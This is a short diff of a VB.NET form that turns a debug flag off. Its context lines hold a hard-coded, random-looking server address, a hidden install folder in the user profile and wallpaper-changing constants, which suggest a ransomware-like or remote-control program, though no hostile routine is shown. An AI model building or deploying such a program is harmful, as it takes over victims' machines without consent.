@@ -10,7 +10,7 @@ Public Class Form1
     Dim UserFoler = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
     Dim ServerAddr = "https://denver3289yf998dh287hd9hd9827h.netlify.app/"
     Dim InstallPath = UserFoler & "\Denver3"
-    Dim DebugMode = True
+    Dim DebugMode = False
     Private Const SPI_SETDESKWALLPAPER As Integer = &H14
 
     Private Const SPIF_UPDATEINIFILE As Integer = &H1
